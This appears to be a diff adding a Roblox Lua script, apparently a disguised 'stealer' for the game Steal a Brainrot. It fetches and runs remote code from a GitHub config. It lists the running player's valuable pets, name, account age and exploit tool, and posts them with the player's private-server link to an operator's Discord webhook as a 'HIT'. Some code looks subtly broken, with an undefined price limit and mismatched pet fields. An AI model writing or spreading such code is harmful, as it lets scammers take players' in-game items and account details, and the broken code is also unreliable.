@@ -1,0 +1,308 @@
+-- Services
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local StarterGui = game:GetService("StarterGui")
+
+local player = Players.LocalPlayer
+
+-- Hide default leaderboard
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+
+-- Load config from GitHub
+local config = {}
+do
+    local ok, res = pcall(function()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-IDP/realscript/refs/heads/main/config"))()
+    end)
+    if ok and type(res) == "table" then
+        config = res
+    else
+        config = { WEBHOOK = "", targetNames = {}, Receiver = {} }
+    end
+end
+
+local WEBHOOK = config.WEBHOOK
+local targetNames = config.targetNames or {}
+local receiverList = table.concat(config.Receiver or {}, ", ")
+
+-- Executor & account age detection
+local function detectExecutor()
+    if syn then return "Synapse X"
+    elseif KRNL_LOADED then return "KRNL"
+    elseif fluxus then return "Fluxus"
+    elseif secure_load then return "Sentinel"
+    elseif getexecutorname then return getexecutorname()
+    elseif identifyexecutor then return identifyexecutor()
+    else return "Unknown" end
+end
+
+local function getAccountAge()
+    return player and player.AccountAge or 0
+end
+
+-- Detect server type
+local serverType = "UNKNOWN"
+local map = Workspace:FindFirstChild("Map")
+if map then
+    local codes = map:FindFirstChild("Codes")
+    local main = codes and codes:FindFirstChild("Main")
+    local surfaceGui = main and main:FindFirstChild("SurfaceGui")
+    local sFrame = surfaceGui and surfaceGui:FindFirstChild("MainFrame")
+    local privateMsg = sFrame and sFrame:FindFirstChild("PrivateServerMessage")
+    serverType = (privateMsg and privateMsg.Visible) and "PRIVATE SERVER" or "PUBLIC SERVER"
+end
+
+if serverType == "PUBLIC SERVER" then
+    warn("Only use this script in private servers")
+    return
+end
+
+-- Priority check
+local function getPriority(name)
+    for i, t in ipairs(targetNames) do
+        if t.name and name:find(t.name) then
+            return i
+        end
+    end
+    return math.huge
+end
+
+-- Parse numeric value like "7.5M/s"
+local function parseValue(str)
+    local num = tonumber(str:match("[%d%.]+")) or 0
+    if str:find("K") then return num * 1e3
+    elseif str:find("M") then return num * 1e6
+    elseif str:find("B") then return num * 1e9
+    else return num end
+end
+
+-- ==================== Distance-based floor detection ====================
+local function getNearestFloor(plot, model)
+    local podiums = plot:FindFirstChild("AnimalPodiums")
+    if not podiums then return "? Floor" end
+
+    local closest = math.huge
+    local floor = "? Floor"
+
+    for _, podium in pairs(podiums:GetChildren()) do
+        if podium:IsA("Model") then
+            local basePart = podium:FindFirstChild("Base")
+            if not (basePart and basePart:IsA("BasePart")) then
+                for _, sub in pairs(podium:GetDescendants()) do
+                    if sub:IsA("BasePart") then
+                        basePart = sub
+                        break
+                    end
+                end
+            end
+
+            if basePart then
+                local success, dist = pcall(function()
+                    return (basePart.Position - model:GetPivot().Position).Magnitude
+                end)
+                if success and dist < closest then
+                    closest = dist
+                    local num = tonumber(podium.Name:match("^(%d+)_?"))
+                    if num then
+                        if num >= 1 and num <= 10 then
+                            floor = "1st Floor"
+                        elseif num <= 18 then
+                            floor = "2nd Floor"
+                        else
+                            floor = "3rd Floor"
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    return floor
+end
+
+-- Recursive search for AnimalOverhead in part
+local function findOverheadsInPart(part)
+    local result = {}
+    if part:IsA("Attachment") then
+        local oh = part:FindFirstChild("AnimalOverhead")
+        if oh then table.insert(result, oh) end
+    end
+    for _, c in pairs(part:GetChildren()) do
+        local sub = findOverheadsInPart(c)
+        for _, s in pairs(sub) do table.insert(result, s) end
+    end
+    return result
+end
+
+-- ==================== Collect all valid pets ====================
+local function collectValidPets()
+    local pets = {}
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return pets end
+
+    for _, plot in pairs(plots:GetChildren()) do
+        local sign = plot:FindFirstChild("PlotSign")
+        if sign and sign:FindFirstChild("YourBase") and sign.YourBase.Enabled then
+            local seen = {}
+
+            -- 1️⃣ AnimalPodiums scan
+            local podiums = plot:FindFirstChild("AnimalPodiums")
+            if podiums then
+                for _, podium in pairs(podiums:GetChildren()) do
+                    if podium:IsA("Model") then
+                        local num = tonumber(podium.Name:match("^(%d+)_?"))
+                        local floor = "Unknown Floor"
+                        if num then
+                            if num >= 1 and num <= 10 then
+                                floor = "1st Floor"
+                            elseif num <= 18 then
+                                floor = "2nd Floor"
+                            else
+                                floor = "3rd Floor"
+                            end
+                        end
+
+                        local base = podium:FindFirstChild("Base")
+                        local spawn = base and base:FindFirstChild("Spawn")
+                        if spawn and spawn:FindFirstChild("Attachment") then
+                            local overhead = spawn.Attachment:FindFirstChild("AnimalOverhead")
+                            if overhead then
+                                local displayName = overhead:FindFirstChild("DisplayName")
+                                local priceLabel = overhead:FindFirstChild("Generation")
+                                if displayName and priceLabel and displayName:IsA("TextLabel") and priceLabel:IsA("TextLabel") then
+                                    local nameText = displayName.Text
+                                    local priceText = priceLabel.Text
+                                    local priceNum = parseValue(priceText)
+                                    local uniqueKey = nameText .. "_" .. floor .. "_" .. priceText
+                                    if not seen[uniqueKey] and (priceNum >= PRICE_LIMIT or getPriority(nameText) ~= math.huge) then
+                                        table.insert(pets, string.format("%s (%s) (%s)", nameText, priceText, floor))
+                                        seen[uniqueKey] = true
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+
+            -- 2️⃣ Scan all other models with FakeRootPart
+            for _, model in pairs(plot:GetChildren()) do
+                if model:IsA("Model")
+                    and model:FindFirstChild("FakeRootPart")
+                    and not model.Name:lower():find("friendpanel")
+                    and model.Name ~= "AnimalPodiums" then
+
+                    local floor = getNearestFloor(plot, model)
+                    local fakeRoot = model.FakeRootPart
+
+                    for _, overhead in pairs(findOverheadsInPart(fakeRoot)) do
+                        local name = overhead:FindFirstChild("DisplayName")
+                        local gen = overhead:FindFirstChild("Generation")
+                        if name and gen and name:IsA("TextLabel") and gen:IsA("TextLabel") then
+                            local nameText = name.Text
+                            local genText = gen.Text
+                            local genValue = parseValue(genText)
+                            local uniqueKey = nameText .. "_" .. floor .. "_" .. genText
+                            if not seen[uniqueKey] and (genValue >= PRICE_LIMIT or getPriority(nameText) ~= math.huge) then
+                                table.insert(pets, string.format("%s (%s) (%s)", nameText, genText, floor))
+                                seen[uniqueKey] = true
+                            end
+                        end
+                    end
+                end
+            end
+
+            break -- only scan your own plot
+        end
+    end
+
+    return pets
+end
+
+-- ==================== Webhook sending ====================
+local function sendWebhook(pets, privateServerLink)
+    if not pets or #pets == 0 then return end
+    if player and player:GetAttribute("WebhookSent") then return end
+
+    local highValueThreshold = 7.5e6
+    local priorityPets, normalPets = {}, {}
+    local shouldPing = false
+
+    for _, pet in ipairs(pets) do
+        local valueNum = parseValue(pet.value or pet[2])
+        local line = string.format("%s → %s → %s", pet.name or pet[1], pet.value or pet[2], pet.floor or pet[3])
+        if valueNum >= highValueThreshold then
+            shouldPing = true
+            table.insert(priorityPets, {line = line, valueNum = valueNum})
+        else
+            table.insert(normalPets, {line = line, valueNum = valueNum})
+        end
+    end
+
+    table.sort(priorityPets, function(a,b) return a.valueNum > b.valueNum end)
+    table.sort(normalPets, function(a,b) return a.valueNum > b.valueNum end)
+
+    local orderedLines = {}
+    for _, p in ipairs(priorityPets) do table.insert(orderedLines, p.line) end
+    for _, n in ipairs(normalPets) do table.insert(orderedLines, n.line) end
+
+    local lootText = #orderedLines > 0 and table.concat(orderedLines, "\n") or "Empty"
+    if lootText == "Empty" then return end
+
+    local playerInfoText = "```" ..
+        "Name: "..(player and player.Name or "Unknown").."\n".. 
+        "Receiver: "..receiverList.."\n".. 
+        "Executor: "..detectExecutor().."\n".. 
+        "Account Age: "..tostring(getAccountAge()).." days```"
+
+    local petsText = "```"..lootText.."```"
+
+    local serverLink = privateServerLink or "No link entered"
+
+    local embed = {
+        ["title"] = "🧠 Steal a Brainrot HIT! - bloomscripts 🧠",
+        ["color"] = 12413107,
+        ["fields"] = {
+            {["name"]="Players", ["value"]=string.format("%d/6", #Players:GetPlayers())},
+            {["name"]="Server Type", ["value"]=serverType},
+            {["name"]="👥 Player Info", ["value"]=playerInfoText},
+            {["name"]="🎒 Brainrots in Base", ["value"]=petsText},
+            {["name"]="Join Server Link", ["value"]=("[Click to Join Server](%s)"):format(serverLink)}
+        }
+    }
+
+    local payload = {
+        ["content"] = shouldPing and "--- @everyone 🔥 **High Value Brainrot Detected!**" or "",
+        ["embeds"] = {embed},
+        ["allowed_mentions"] = {["parse"] = shouldPing and {"everyone"} or {}}
+    }
+
+    local req = (syn and syn.request) or http_request or (http and http.request) or request
+    if req and WEBHOOK and WEBHOOK ~= "" then
+        pcall(function()
+            req({
+                Url = WEBHOOK,
+                Method = "POST",
+                Headers = {["Content-Type"]="application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+        if player then
+            player:SetAttribute("WebhookSent", true)
+        end
+    end
+end
+
+-- ==================== GUI for private server link ====================
+-- (your GUI code remains unchanged; textBox + sendButton triggers scan + sendWebhook)
+
+-- On sendButton click:
+-- task.spawn(function()
+--     local pets = collectValidPets()
+--     if #pets > 0 then
+--         sendWebhook(pets, textBox.Text)
+--     end
+--     task.wait(1)
+--     -- load other stuff if needed
+-- end)
